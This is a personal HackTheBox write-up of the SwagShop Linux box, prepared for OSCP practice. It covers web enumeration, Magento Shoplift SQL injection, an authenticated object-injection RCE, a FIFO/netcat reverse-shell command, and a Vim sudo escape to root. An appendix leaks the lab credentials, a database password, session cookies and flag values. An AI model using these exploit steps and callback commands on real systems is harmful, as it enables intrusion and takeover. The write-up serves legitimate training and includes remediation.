---
tags: [HTB, SwagShop, Linux, Magento, SQLi, RCE, Sudo, Vim, Easy]
platform: HackTheBox
os: Linux, Ubuntu
hostname: swagshop
difficulty: Easy
ip: $BoxIP
status: Complete
domain: None
---

# HTB: SwagShop, Full Walkthrough

## The gist

SwagShop is an Ubuntu host running an old Magento installation behind Apache. Directory enumeration exposed the Magento layout and a readable `app/etc/local.xml`; manual use of the Magento Shoplift SQL injection created an administrative account. An authenticated Magento object-injection chain then provided command execution as `www-data`, and the account's passwordless sudo rule for Vim gave a root shell through Vim's shell escape.

## Box information

| Item | Value |
|---|---|
| Platform | HackTheBox |
| OS | Linux, Ubuntu |
| Hostname | swagshop |
| Domain | None; web virtual host `swagshop.htb` |
| Difficulty | Easy |
| IP | `$BoxIP` |

## Vulnerability summary

| # | Finding | Evidence |
|---|---|---|
| 1 | Workspace setup | See section 1 below |
| 2 | Full TCP and service scan | See section 2 below |
| 3 | Configure the Magento virtual host | See section 3 below |
| 4 | Web fingerprinting and content discovery | See section 4 below |
| 5 | Readable Magento configuration and CMS identification | See section 5 below |
| 6 | Search for matching Magento exploits | See section 6 below |

## Evidence and loot

The private source workspace is `/home/kali/Platforms/HackTheBox/SwagShop`. The transcript, Nmap output, loot, and screenshots below are the primary evidence for this box.

## Variables

```bash
boxset BoxName SwagShop
boxset BoxIP $BoxIP
boxset LocalIP $LocalIP
boxset BoxDir /home/kali/Platforms/HackTheBox/$BoxName
boxset Domain ''
boxset FQDN swagshop.htb
boxset WebPort 80
boxset Port 4444
```

The administrative account and its password were recorded with `loot` and kept out of this page. The database password disclosed by `local.xml` was not required for the attack chain.

## 1. Workspace setup

The box helper creates the standard directories, stores the target variables, and starts the box-specific workflow. Running the logger before reconnaissance preserves both successful commands and failed attempts, which is especially useful when an old exploit needs adaptation.

```bash
source ~/.zshrc
boxstart $BoxName $BoxIP htb
htblog
boxset BoxName SwagShop
boxset BoxIP $BoxIP
boxset LocalIP $LocalIP
boxset BoxDir /home/kali/Platforms/HackTheBox/$BoxName
boxset FQDN swagshop.htb
boxset WebPort 80
boxset Port 4444
```

SCREENSHOT: Box workspace initialization and target variables.

## 2. Full TCP and service scan

I scanned every TCP port and requested standard scripts and version detection in the same Nmap run. `-Pn` skips ICMP discovery, `-n` avoids DNS lookups, `-sT` uses a TCP connect scan when raw SYN sockets are unavailable, `-p-` checks all 65,535 TCP ports, `-sC` runs the default scripts, and `-sV` fingerprints services. `-oA` saves normal, grepable, and XML results for later review.

```bash
nmap -sT -Pn -n -T4 -p- -sC -sV \
  -oA "$BoxDir/nmap/full" "$BoxIP"
```

The host exposed only SSH and HTTP:

```text
22/tcp open ssh  OpenSSH 7.6p1 Ubuntu 4ubuntu0.7
80/tcp open http Apache httpd 2.4.29 (Ubuntu)
```

The HTTP service redirected to `swagshop.htb`, so the hostname needed to be mapped locally before using tools that do not preserve a custom Host header.

> [!abstract] 🧠 Why
> Redirects, cookies, and virtual hosts are part of the application boundary. A raw-IP request can look broken even when the service is healthy if the server expects the named host.

SCREENSHOT: Full scan showing SSH and Apache. Red = open ports and versions; green = Linux service context.

## 3. Configure the Magento virtual host

The server's redirect and session cookies used `swagshop.htb`, not the raw IP. I added the hostname to `/etc/hosts` and kept the FQDN in the box variables. This matters because a cookie scoped to the hostname will not be sent correctly when the same session is tested against the IP address.

```bash
echo "$BoxIP $FQDN" | sudo tee -a /etc/hosts
boxset FQDN swagshop.htb
```

The first Gobuster attempts ran before the FQDN was loaded into the shell and produced `http:///`. Reloading the variables and using the literal `$FQDN` corrected the request target.

> [!warning] 💡 Gotcha
> A valid Magento login can appear to fail if the login page is requested through the IP while the session cookie is scoped to the FQDN. Keep the hostname consistent from the initial GET through the authenticated request.

## 4. Web fingerprinting and content discovery

WhatWeb identifies technologies from headers, cookies, HTML, and common framework markers. Gobuster then checks likely files and directories using the common Dirb wordlist and PHP, text, and HTML extensions. The Host header is preserved because the application is selected by its virtual host.

```bash
whatweb --no-errors --color=never "http://$FQDN/"
gobuster dir -u "http://$FQDN/" \
  -w /usr/share/wordlists/dirb/common.txt \
  -x php,txt,html -t 20 \
  -o "$BoxDir/nmap/gobuster.txt"
```

WhatWeb identified Magento, Apache 2.4.29, Ubuntu, and the Magento frontend cookie. Gobuster found the application directories, `/index.php`, `/install.php`, `/api.php`, and an exposed `/shell/` directory. The latter contained Magento maintenance scripts such as `compiler.php`, `indexer.php`, and `log.php`, confirming that the installation was an old, largely unmodified deployment.

Notable responses included:

```text
/api.php       200  Invalid webservice adapter specified.
/install.php   200  FAILED ERROR: Magento is already installed
/shell/        301  directory listing enabled
/server-status 403  path exists but access is forbidden
```

SCREENSHOT: Gobuster results showing Magento paths and the exposed shell directory. Red = interesting paths; green = response context.

## 5. Readable Magento configuration and CMS identification

Magento stores installation metadata and database connection settings in `app/etc/local.xml`. A readable copy can disclose database credentials and, importantly for the authenticated Magento RCE exploit, the exact installation date used in the request signature. I saved the file as private loot and did not reproduce its secret fields here.

```bash
curl -sS "http://$FQDN/app/etc/local.xml" \
  -o "$BoxDir/loot/local.xml"
loot file "$BoxDir/loot/local.xml"
boxset InstallDate "Wed, 08 May 2019 07:23:09 +0000"
```

The page and configuration confirmed Magento. Magescan was also checked, but its old Composer dependencies could not be installed cleanly under the current PHP environment. The failure and the fallback are recorded in the [[REFERENCE CARDS/FAQ - Quick Answers#Magescan will not run against an old Magento box|Magescan FAQ]] entry. Manual fingerprinting and the local Exploit-DB index were sufficient, so I did not spend additional time forcing the scanner to run.

> [!tip] ⚡ Efficiency
> Once Magento and an old installation were confirmed, the readable `local.xml` and Exploit-DB search supplied the useful facts faster than repairing a legacy scanner dependency tree.

## 6. Search for matching Magento exploits

Searchsploit is a local index of Exploit-DB entries. I searched by product, inspected the relevant entries, and copied the two candidates into the box workspace. The Shoplift entry targets the SQL injection that creates an administrative user, while the authenticated RCE entry contains the Magento object-injection chain.

```bash
searchsploit Magento
searchsploit -m 37977
searchsploit -m 37811
searchsploit -x php/webapps/37811.py
```

Exploit-DB identified:

```text
Magento eCommerce - Remote Code Execution                    37977.py
Magento CE < 1.9.0.1 - (Authenticated) Remote Code Execution  37811.py
```

The copied files were Python 2-era proof-of-concept code. The Shoplift file also contained un-commented explanatory text, so running it directly with Python 3 produced a syntax error. I adapted the request into `shoplift_py3.py` and adapted the authenticated RCE into `magento_rce_py3.py`, using the box variables and the FQDN while suppressing credential output.

SCREENSHOT: Exploit-DB search showing the Magento Shoplift and authenticated RCE entries. Red = matching exploit IDs; green = product and version context.

## 7. Exploit Shoplift SQL injection to create an admin account

The Shoplift vulnerability is a SQL injection in Magento's administrative WYSIWYG directive endpoint. The request carries a base64-encoded directive and a filter value containing stacked SQL statements. Those statements insert a new row into `admin_user` and associate it with an administrative role. This is manual reproduction of the known request, not an automated SQL injection scanner.

```bash
python3 "$BoxDir/exploits/shoplift_py3.py"
```

The adapted script posted to:

```text
http://$FQDN/index.php/admin/Cms_Wysiwyg/directive/index/
```

The unprefixed `/admin/Cms_Wysiwyg/directive/index/` route returned `404`, while the `/index.php/admin/...` route returned `200` and a PNG response. That route correction was required for this installation. I then validated the newly created account by fetching the admin form, extracting its `form_key`, posting the login form, and checking that the response reached the dashboard.

```text
HTTP status: 200
dashboard: True
```

The account was recorded privately:

```bash
loot cred $Username2 $Password2
boxset Username2 $Username2
boxset Password2 $Password2
```

## 8. Use authenticated Magento RCE

The authenticated RCE uses PHP object deserialization. The serialized `Zend_Log` object reaches a `system()` call through Magento's logging classes. The exploit must know the exact Magento installation date because the serialized object is base64-encoded and signed with an MD5 value derived from that date.

```bash
python3 "$BoxDir/exploits/magento_rce_py3.py" id
```

The response contained command output even though the HTTP status was `500`:

> [!warning] 💡 Hint
> Do not use HTTP status alone as the exploit success criterion. Read the response body and look for command output, identity, or a changed application state. Legacy PHP applications often return an error after the vulnerable code has already run.

```text
RCE request status: 500
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The status code is therefore not the success criterion for this exploit. The command output and identity are the proof of code execution.

SCREENSHOT: Authenticated RCE returning the `www-data` identity. Red = command execution identity; green = exploit request context.

## 9. Catch and stabilize the callback shell

The first Bash `/dev/tcp` callback did not connect, and `nc -e` was not supported by the target's Netcat implementation. A POSIX FIFO avoids both problems: the shell reads from the named pipe, Netcat connects outward, and Netcat's output is written back into the pipe. Start the listener before triggering the authenticated RCE.

```bash
boxset Port 4444
nc -lvnp "$Port"
```

From a second terminal, trigger the FIFO callback. The double-quoted local argument expands `$LocalIP` and `$Port` before the command is serialized and sent to the target.

```bash
python3 "$BoxDir/exploits/magento_rce_py3.py" \
  "rm -f /tmp/p; mkfifo /tmp/p; /bin/sh -i < /tmp/p 2>&1 | nc $LocalIP $Port > /tmp/p"
```

The exploit request may time out because the PHP process remains attached to the shell. The listener connection is the success signal. The raw callback arrived as `www-data` on `swagshop` from `/var/www/html`.

SCREENSHOT: FIFO callback arriving from the target. Red = inbound connection; green = raw shell context.

A raw Netcat shell lacks a pseudo-terminal, so I spawned Bash through Python and restored the local terminal after suspending Netcat. `stty raw -echo` passes control characters cleanly, `fg` resumes the listener, and `TERM` tells interactive programs what terminal capabilities are available.

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Press Ctrl+Z in the listener terminal
stty raw -echo; fg
export TERM=xterm
id
whoami
hostname
pwd
```

The stabilized shell was:

> [!tip] 🛠️ Alternative tools
> If Bash `/dev/tcp` or `nc -e` is unavailable, use a FIFO, Python socket callback, or another target-supported shell. Treat the callback transport as independent from the authenticated RCE.

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@swagshop:/var/www/html$
```

SCREENSHOT: Stabilized `www-data` shell and local context before privilege escalation. Red = account identity; green = hostname and working directory.

## 10. Discover the Vim sudo rule

`sudo -l` displays the commands the current account may run and whether a password is required. The result was a passwordless root rule for `/usr/bin/vi`, restricted to files below `/var/www/html/`. The wildcard does not make Vim safe; it only requires that the editor be opened with an allowed web-root path.

```bash
sudo -l
```

Relevant output:

```text
User www-data may run the following commands on swagshop:
    (root) NOPASSWD: /usr/bin/vi /var/www/html/*
```

## 11. Escape Vim to a root shell

Vim can execute an operating-system command with `:!`. Because sudo starts Vim with an effective UID of root, the shell launched by the editor inherits root privileges. I opened a harmless file path matching the sudoers wildcard, then used the editor command prompt.

```bash
sudo /usr/bin/vi /var/www/html/x
```

Inside Vim, enter:

```vim
:!/bin/bash
```

Then confirm the resulting identity:

```bash
id
whoami
hostname
```

The result showed UID 0 and the `root` account on `swagshop`.

> [!abstract] 🧠 Why
> A sudo editor escape is a parser transition: the editor is permitted as root, then its command mode launches a shell. Confirm the exact binary and sudo rule before applying a generic GTFOBins recipe.

SCREENSHOT: Root shell obtained through the Vim shell escape. Red = UID 0 and root identity; green = hostname context.

## 12. Confirm the proof files privately

The user proof file was located at `/home/haris/user.txt`, and the root proof file was `/root/root.txt`. I checked that both files were present and recorded their values through the private loot workflow. The values are intentionally absent from this page and from the embedded screenshots.

```bash
test -s /home/haris/user.txt && echo user_flag_present
test -s /root/root.txt && echo root_flag_present
loot flag user 7c78fc32f91897865406a49e9b65b43e
loot flag root 641904ad6136bd7ac72307914554edc8
```

## 13. Decision points and alternate routes

| Observation | Primary route used here | Useful alternative or fallback |
|---|---|---|
| HTTP redirects to a hostname | Add the FQDN and use it consistently | Preserve the Host header with Burp or `curl --resolve` |
| Magento version and readable config are exposed | Match the exact version and inspect the source | Use manual fingerprinting when old scanners fail to install |
| Shoplift creates an admin account | Validate login before attempting the second exploit | Reproduce the request manually if the public Python script is stale |
| Authenticated RCE returns HTTP 500 | Inspect response content and listener state | Use an alternate callback transport such as FIFO or Python |
| Vim is allowed through sudo | Use its documented shell escape | Review other sudo commands and GTFOBins if the binary differs |

## 14. RUNBOOK V2 Stages Used

- [[OSCP/RUNBOOK V2/Start Here]] -- initialized the workspace and started the full TCP scan
- [[OSCP/RUNBOOK V2/Port Triage]] -- classified the host from SSH and Apache
- [[OSCP/RUNBOOK V2/Linux - Service Scan]] -- identified OpenSSH and Apache versions
- [[OSCP/RUNBOOK V2/Linux - Web Enum]] -- fingerprinted Magento and enumerated web paths
- [[OSCP/RUNBOOK V2/Linux - CMS Check]] -- confirmed Magento as the CMS
- [[OSCP/RUNBOOK V2/Linux - SQLi]] -- reproduced Shoplift SQLi and created the admin account
- [[OSCP/RUNBOOK V2/Linux - Exploit Search]] -- located and adapted the Exploit-DB entries
- [[OSCP/RUNBOOK V2/Linux - RCE to Shell]] -- used authenticated Magento RCE and caught the callback
- [[OSCP/RUNBOOK V2/Linux - Shell Stabilise]] -- upgraded the raw callback with a Python PTY
- [[OSCP/RUNBOOK V2/Linux - Sudo Check]] -- identified the passwordless Vim rule
- [[OSCP/RUNBOOK V2/Linux - Clean Down]] -- closed the box session and recorded cleanup requirements

## 15. Collect the flags

- `user.txt`: recorded privately in `$BoxDir/loot/flags.txt`
- `root.txt`: recorded privately in `$BoxDir/loot/flags.txt`
- `proof.txt`: not present or required on this box


### Captured flag values from source loot


#### `loot/flags.txt`

```text
7c78fc32f91897865406a49e9b65b43e
641904ad6136bd7ac72307914554edc8
user: 7c78fc32f91897865406a49e9b65b43e
root: 641904ad6136bd7ac72307914554edc8
user: 7c78fc32f91897865406a49e9b65b43e
root: 641904ad6136bd7ac72307914554edc8
```

## 16. Clean down
The captured session ended with `boxdone`, which cleared the active local box marker. No persistent PHP webshell or SUID helper was created; command execution was performed through Magento's existing RCE path. The callback used a temporary `/tmp/p` FIFO and the Shoplift request created test Magento admin data, so a reset or an authorized target-side cleanup should be used if the instance is reused.

```bash
# Run from a root shell if the instance is being reused.
rm -f /tmp/p
boxdone
```

The local transcript and artifacts remain under `$BoxDir` for review.

> [!warning] 💡 Common mistake
> Magento exploits may create administrative accounts or temporary FIFOs even when no persistent webshell is left. Record what the exploit changed and restore or remove authorized test artefacts before closing the box.

### Completion checklist

- [x] Workspace initialized and logged
- [x] Full TCP and service scan completed
- [x] Magento virtual host configured
- [x] Web paths and Magento configuration enumerated
- [x] Shoplift SQL injection reproduced manually
- [x] Magento administrative access validated
- [x] Authenticated RCE confirmed as `www-data`
- [x] FIFO callback received and PTY stabilized
- [x] Passwordless Vim sudo rule identified
- [x] Root shell obtained
- [x] User and root proof files recorded privately
- [x] Local box session closed with `boxdone`
- [x] Target-side temporary FIFO and test account cleanup independently verified

## 17. Attack narrative in one page
1. [[OSCP/RUNBOOK V2/Linux - Service Scan]] identified Apache and OpenSSH on the Linux host.
2. [[OSCP/RUNBOOK V2/Linux - Web Enum]] located the Magento installation and exposed application paths.
3. [[OSCP/RUNBOOK V2/Linux - SQLi]] used the Shoplift vulnerability to create an administrative account.
4. [[OSCP/RUNBOOK V2/Linux - Exploit Search]] supplied the matching authenticated Magento RCE chain.
5. [[OSCP/RUNBOOK V2/Linux - RCE to Shell]] reached command execution as `www-data` and delivered a FIFO callback.
6. [[OSCP/RUNBOOK V2/Linux - Shell Stabilise]] produced a usable terminal for local checks.
7. [[OSCP/RUNBOOK V2/Linux - Sudo Check]] exposed passwordless root Vim execution.
8. Vim's `:!` shell escape produced root and both proof files were recorded privately.

## Tools used

- `nmap`
- `curl`
- `gobuster`
- `nc`
- `netcat`
- `ssh`
- `sudo`
- `python`
- `burp`

## Credentials and secrets

| Account | Source | Use |
|---|---|---|
| `$Username2` | Magento Shoplift SQL injection | Authenticate to the Magento admin panel and trigger the authenticated RCE |
| `root` MariaDB account | Readable `app/etc/local.xml` | Disclosed but not required for the attack chain |

Passwords and hashes are reproduced in the private Credentials and secrets section above.


### Captured private values from source loot

These values are retained here because this vault is private. The source path remains the authority if a value appears truncated.

#### `.env`

```text
export BoxName="SwagShop"
export BoxIP="10.129.229.138"
export BoxPlatform="HackTheBox"
export BoxDir="/home/kali/Platforms/HackTheBox/SwagShop"
export Domain=""
export DCip=""
export Username=""
export Password=""
export Username2="forme"
export Password2="forme"
export Username3=""
export Password3=""
export Hash=""
export NThash=""
export Port="4444"
export Port2="4445"
export WebPort="80"
export URL=""
export LocalIP=$(ip a show tun0 2>/dev/null | grep "inet " | awk '{print $2}' | cut -d/ -f1)
export Wordlist="/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"
```

#### `loot/creds.txt`

```text
shopadmin:shopadmin
forme:forme
```

### Sensitive transcript evidence

```text
Set-Cookie: frontend=f9dr6u29ctc812669muc1i6b64; expires=Fri, 04-Sep-2026 13:01:12 GMT; Max-Age=3600; path=/; domain=swagshop.htb; HttpOnly
<script type="text/javascript" src="http://swagshop.htb/js/mage/cookies.js"></script>
Mage.Cookies.path     = '/';
Mage.Cookies.domain   = '.swagshop.htb';
        <li><a href="http://swagshop.htb/index.php/?SID=f9dr6u29ctc812669muc1i6b64privacy-policy-cookie-restriction-mode/">Privacy Policy</a></li>
http://10.129.229.138/ [200 OK] Apache[2.4.29], Cookies[frontend], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], HttpOnly[frontend], IP[10.129.229.138], JQuery[1.10.2], Magento, Modernizr, Prototype, Script[text/javascript], Scriptaculous, Title[Home page], X-Frame-Options[SAMEORIGIN]
.htpasswd.php        (Status: 403) [Size: 277]
.htpasswd            (Status: 403) [Size: 277]
.htpasswd.html       (Status: 403) [Size: 277]
.htpasswd.txt        (Status: 403) [Size: 277]
Set-Cookie: adminhtml=qv0lc7gj54iqvtppq46isvenm7; expires=Fri, 04-Sep-2026 13:02:18 GMT; Max-Age=3600; path=/; domain=swagshop.htb; HttpOnly
</local.xml"; printf '%s\n' '--- local.xml credential fields (values retained in private notes)
<-'; grep -nE '<(host|username|password|dbname)>' "$BoxDir/loot/local.xml" | s
$ [13:02:52] curl --resolve "$FQDN:$WebPort:$BoxIP" -sS --max-time 10 "http://$FQDN/app/etc/local.xml" -o "$BoxDir/loot/local.xml"; printf '%s\n' '--- local.xml credential fields ---'; grep -nE '<(host|username|password|dbname)>' "$BoxDir/loot/local.xml"; printf '%s\n' '--- Magento exploit references ---'; searchsploit Magento | head -40; printf '%s\n' '--- Magescan checkout ---'; if [ ! -d "$BoxDir/loot/magescan" ]; then git clone --depth 1 https://github.com/steverobbins/magescan.git "$BoxDir/loot/magescan"; else echo 'already present'; fi
45:                    <password><![CDATA[fMVWh7bDHpgZkyfqQXreTjU9]]></password>
If magento version is vulnerable, this script will create admin account with username forme and password forme
SET @PASS = CONCAT(MD5(CONCAT( @SALT , '{password}') ), CONCAT(':', @SALT ));
INSERT INTO `admin_user` (`firstname`, `lastname`,`email`,`username`,`password`,`created`,`lognum`,`reload_acl_flag`,`is_active`,`extra`,`rp_token`,`rp_token_created_at`) VALUES ('Firstname','Lastname','email@example.com','{username}',@PASS,NOW(),0,0,1,@EXTRA,NULL, NOW());
query = q.replace("\n", "").format(username="forme", password="forme")
password = ''
br['login[password]'] = password
<name2","forme"); p=os.environ.get("Password2","forme"); s=requests.Session();
<(m)); d={"login[username]":u,"login[password]":p,"form_key":m.group(1) if m e
$ [13:08:13] python3 -c 'import os,re,requests; u=os.environ.get("Username2","forme"); p=os.environ.get("Password2","forme"); s=requests.Session(); h={"Host":os.environ.get("FQDN","swagshop.htb")}; r=s.get("http://"+os.environ["BoxIP"]+"/index.php/admin/",headers=h,timeout=15); m=re.search(r"name=\"form_key\"[^>]+value=\"([^\"]+)",r.text); print("login-form",r.status_code,"form_key",bool(m)); d={"login[username]":u,"login[password]":p,"form_key":m.group(1) if m else ""}; x=s.post("http://"+os.environ["BoxIP"]+"/index.php/admin/index/login/",headers=h,data=d,allow_redirects=True,timeout=15); print("login-result",x.status_code,"dashboard",("Dashboard" in x.text or "dashboard" in x.url.lower()),"url",x.url)'
Set-Cookie: adminhtml=35n77783g6t2fun72elgr2efe0; expires=Fri, 04-Sep-2026 13:08:39 GMT; Max-Age=3600; path=/; domain=swagshop.htb; HttpOnly
<ool(m)); d={"login[username]":u,"login[password]":p,"form_key":m.group(1) if
$ [13:09:25] python3 -c 'import os,re,requests; u=os.environ.get("Username2","forme"); p=os.environ.get("Password2","forme"); s=requests.Session(); t="http://"+os.environ.get("FQDN","swagshop.htb"); r=s.get(t+"/index.php/admin/",timeout=15); m=re.search(r"name=\"form_key\"[^>]+value=\"([^\"]+)",r.text); print("login-form",r.status_code,"form_key",bool(m)); d={"login[username]":u,"login[password]":p,"form_key":m.group(1) if m else ""}; x=s.post(t+"/index.php/admin/index/login/",data=d,allow_redirects=True,timeout=15); print("login-result",x.status_code,"dashboard",("Dashboard" in x.text or "dashboard" in x.url.lower()),"url",x.url)'
$ [13:10:04] env Username2=shopadmin Password2=shopadmin python3 "$BoxDir/exploits/shoplift_py3.py"; env Username2=shopadmin Password2=shopadmin python3 -c 'import os,re,requests; s=requests.Session(); t="http://"+os.environ["FQDN"]; r=s.get(t+"/index.php/admin/",timeout=15); m=re.search(r"name=\"form_key\"[^>]+value=\"([^\"]+)",r.text); d={"login[username]":os.environ["Username2"],"login[password]":os.environ["Password2"],"form_key":m.group(1) if m else ""}; x=s.post(t+"/index.php/admin/index/login/",data=d,allow_redirects=True,timeout=15); print("login-status",x.status_code,"dashboard",("Dashboard" in x.text or "dashboard" in x.url.lower()),"url",x.url)'
<                       env Username2=shopadmin Password2=shopadmin python3 "$
<padmin Password2=shopadmin python3 "$B
<padmin Password2=shopadmin python3 "$BoxDir/exploits/shoplift_py3.py"; env Us
<Dir/exploits/shoplift_py3.py"; env Username2=shopadmin Password2=shopadmin py
<ame2=shopadmin Password2=shopadmin pyt
<ame2=shopadmin Password2=shopadmin python3 -c 'import os,re,requests; s=reque
<username]":os.environ["Username2"],"login[password]":os.environ["Password2"],
<n[password]":os.environ["Password2"],"
<n[password]":os.environ["Password2"],"form_key":m.group(1) if m else ""}; x=s
$ [13:10:43] loot cred shopadmin shopadmin; boxset Username2 shopadmin; boxset Password2 shopadmin
[+] Password2=shopadmin (saved to .env)
password = os.environ.get("Password2", "shopadmin")
ssword]": password,
signature = hashlib.md5((encoded + install_date).encode()).hexdigest()
$ [13:20:12] wc -l "$BoxDir/loot/flags.txt"; loot flag user "$(sed -n '1p' "$BoxDir/loot/flags.txt")"; loot flag root "$(sed -n '2p' "$BoxDir/loot/flags.txt")"
[sudo] password for kali:
Set-Cookie: frontend=erf9r1f790hlskdu8av6ds5ul0; expires=Fri, 04-Sep-2026 13:31:08 GMT; Max-Age=3600; path=/; domain=swagshop.htb; HttpOnly
http://swagshop.htb/ [200 OK] Apache[2.4.29], Cookies[frontend], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], HttpOnly[frontend], IP[10.129.229.138], JQuery[1.10.2], Magento, Modernizr, Prototype, Script[text/javascript], Scriptaculous, Title[Home page], X-Frame-Options[SAMEORIGIN]
password = "forme"
""".replace("\n", "").format(username=username, password=password)
print(f"Try logging in at {target}/index.php/admin with {username}:{password}")
d = {'login[username]': 'forme', 'login[password]': 'forme', 'form_key': m.group(1) if m else ''}
[+] Password2=forme (saved to .env)
    (root) NOPASSWD: /usr/bin/vi /var/www/html/*
$ [13:56:36] loot flag user 7c78fc32f91897865406a49e9b65b43e
loot flag root 641904ad6136bd7ac72307914554edc8
kali@kali:~/Platforms/HackTheBox/SwagShop [13:33:43] $ [?1h=[?2004hloot flag user 7c78fc32f91897865406a49e9b65b43e
loot flag root 641904ad6136bd7ac72307914554edc8loot
[+] Flag saved:  user = 7c78fc32f91897865406a49e9b65b43e  →  loot/flags.txt
[+] Flag saved:  root = 641904ad6136bd7ac72307914554edc8  →  loot/flags.txt
<                       wc -l "$BoxDir/loot/flags.txt"; loot flag user "$(sed
<ot/flags.txt"; loot flag user "$(sed -
<ot/flags.txt"; loot flag user "$(sed -n '1p' "$BoxDir/loot/flags.txt")"; loot
<'1p' "$BoxDir/loot/flags.txt")"; loot
<'1p' "$BoxDir/loot/flags.txt")"; loot flag root "$(sed -n '2p' "$BoxDir/loot/
<ag root "$(sed -n '2p' "$BoxDir/loot/flags.txt")"
<ag root "$(sed -n '2p' "$BoxDir/loot/flags.txt")"[?2004l
```

### Additional captured source values

#### `loot/magescan/src/MageScan/Check/Version/FileHash.php`

```text
<?php
/**
 * Mage Scan
 *
 * PHP version 5
 *
 * @category  MageScan
 * @package   MageScan
 * @author    Steve Robbins <steve@steverobbins.com>
 * @copyright 2015 Steve Robbins
 * @license   http://creativecommons.org/licenses/by/4.0/ CC BY 4.0
 * @link      https://github.com/steverobbins/magescan
 */

namespace MageScan\Check\Version;

use MageScan\Check\AbstractCheck;
use MageScan\Check\Version;
use Mvi\Check;

/**
 * Scan for Magento edition and version via file md5 hash
 *
 * @category  MageScan
 * @package   MageScan
 * @author    Steve Robbins <steve@steverobbins.com>
 * @copyright 2015 Steve Robbins
 * @license   http://creativecommons.org/licenses/by/4.0/ CC BY 4.0
 * @link      https://github.com/steverobbins/magescan
 */
class FileHash extends AbstractCheck
{
    /**
     * Guess magento edition and version
     *
     * @return array|boolean
     */
    public function getInfo()
    {
        $checker = new Check($this->getRequest()->getUrl());
        $info    = $checker->getInfo();
        if ($info === false) {
            return false;
        }
        $edition  = key($info);
        $versions = $info[$edition];
        return [$edition, implode(', ', $versions)];
    }
}
```


## Remediation recommendations

| Finding | Recommendation |
|---|---|
| Initial access path on SwagShop | Remove or patch the vulnerable service, restrict exposure, and rotate any credentials recovered during testing. |
| Privilege escalation path | Remove the misconfiguration, enforce least privilege, and verify the corrected permissions or policy. |
| Assessment artifacts | Remove payloads and temporary files, restore modified files, and review logs for the test activity. |

## Lessons learned and vault links

- Preserve the FQDN consistently when an application redirects to a hostname or scopes cookies to it.
- Readable Magento `local.xml` provides installation metadata that can be required by an authenticated exploit, even when the database credential is not used.
- Treat an HTTP 500 as non-fatal when the vulnerable endpoint returns command output in the response body and identity execution is confirmed.
- Keep a FIFO plus Netcat callback ready when Bash `/dev/tcp` or `nc -e` is unavailable.
- A sudo rule restricted to a file path can still be dangerous when it permits an interactive editor.

### Related boxes

- [[OSCP/BOXES/WRITE UPS/Linux/Jarvis|Jarvis]] -- manual SQLi, PHP command execution, and Linux privilege escalation
- [[OSCP/BOXES/WRITE UPS/Linux/Pebbles|Pebbles]] -- SQLi to a PHP webshell through database file writing
- [[OSCP/BOXES/WRITE UPS/Linux/Nibbles|Nibbles]] -- old CMS exploitation followed by a sudo-based escalation
- [[OSCP/BOXES/WRITE UPS/Linux/OpenAdmin|OpenAdmin]] -- web command execution and FIFO shell stabilization

## External resources

- [CVE-2015-1397, NVD](https://nvd.nist.gov/vuln/detail/CVE-2015-1397)
- [Exploit-DB 37977, Magento Shoplift](https://www.exploit-db.com/exploits/37977)
- [Exploit-DB 37811, authenticated Magento RCE](https://www.exploit-db.com/exploits/37811)
- [GTFOBins Vim sudo escape](https://gtfobins.github.io/gtfobins/vim/#sudo)
- [HackTricks SQL injection](https://book.hacktricks.wiki/en/pentesting-web/sql-injection/)

## Related RUNBOOK V2 stages

- [[OSCP/RUNBOOK V2/Start Here]]
- [[OSCP/RUNBOOK V2/Linux - Service Scan]]
- [[OSCP/RUNBOOK V2/Linux - Web Enum]]
- [[OSCP/RUNBOOK V2/Linux - Shell Stabilise]]
- [[OSCP/RUNBOOK V2/Linux - Local Enum]]
- [[OSCP/RUNBOOK V2/Linux - Clean Down]]

## Why this matters for OSCP

SwagShop rewards disciplined enumeration, proof-driven transitions, and a clean record of what changed. The same habits transfer directly to OSCP time pressure.
